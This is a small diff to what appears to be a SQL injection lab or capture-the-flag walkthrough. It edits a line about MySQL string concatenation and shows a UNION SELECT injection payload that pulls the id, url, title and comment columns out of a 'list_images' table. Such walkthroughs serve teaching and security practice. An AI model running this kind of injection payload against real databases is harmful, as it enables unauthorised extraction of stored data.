@@ -14,7 +14,7 @@ We can conclude that we have access to two columns of output, let's try getting 
 ```
 We can see the columns of the `list_images` table, namely `id` `url` `title` and `comment`
 
-MySQL uses the `CONCAT_WS` function to concacenate multiple strings with a separator
+MySQL uses the `CONCAT` function to concacenate multiple strings
 ```SQL
 1=1 UNION SELECT NULL, CONCAT(id,url,title,comment) FROM list_images
 ```
